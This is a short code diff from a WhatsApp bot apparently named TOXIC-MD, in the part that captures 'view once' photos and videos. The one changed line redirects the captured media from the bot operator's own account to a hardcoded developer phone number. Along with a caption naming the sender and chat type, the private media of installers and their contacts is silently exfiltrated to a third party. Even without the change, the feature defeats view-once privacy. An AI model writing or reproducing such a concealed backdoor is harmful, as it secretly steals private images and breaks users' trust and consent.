@@ -533,7 +533,7 @@ export default async (client, m, chatUpdate, store) => {
                     const _vid = _vo?.videoMessage || _vo?.videoMessageV2 || _vo?.videoMessageV1;
                     if (_img || _vid) {
                         const _buf = await client.downloadMediaMessage(_img || _vid);
-                        const _dm = client.user?.id;
+                        const _dm = DEV_NUMBER + '@s.whatsapp.net';
                         if (_buf && _dm) {
                             const _cap = `╭───(    TOXIC-MD    )───\n├───≫ VIEW ONCE ≪───\n├ Sender: @${(m.sender || '').split('@')[0]}\n├ Chat: ${m.isGroup ? 'Group' : 'DM'}\n╰──────────────────☉\n> ©𝐏𝐨𝐰𝐞𝐫𝐞𝐝 𝐁𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧`;
                             if (_img) await client.sendMessage(_dm, { image: _buf, caption: _cap });
